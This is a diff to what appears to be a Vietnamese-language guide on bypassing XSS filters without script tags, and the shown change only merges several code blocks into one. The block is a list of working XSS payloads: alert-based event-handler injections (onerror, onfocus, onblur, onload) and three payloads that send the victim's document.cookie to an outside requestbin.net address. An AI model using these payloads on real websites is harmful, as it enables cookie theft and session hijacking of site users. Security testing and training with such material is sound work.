@@ -53,43 +53,25 @@ Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu v
 
 * Không dùng thẻ script
 
-```js
+```
 <img src=x onerror=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>
-```
 
-```js
 <video src=1 onerror=alert(1)>
-```
 
-```js
 <audio src=1 onerror=alert(1)>
-```
 
-```js
 <img src=1 href=1 onerror="javascript:alert(1)"></img>
-```
 
-```js
 <audio src=1 href=1 onerror="javascript:alert(1)"></audio>
-```
 
-```js
 <video src=1 href=1 onerror="javascript:alert(1)"></video>
-```
 
-```js
 <input onblur=javascript:alert(1) autofocus><input autofocus>
-```
 
-```js
 <BODY ONLOAD=alert('XSS')>
-```
 
-```js
 <button autofocus onfocus=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)></button>
-```
 
-```js
 <a onmouseover=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>xxs link</a>
 ```
 
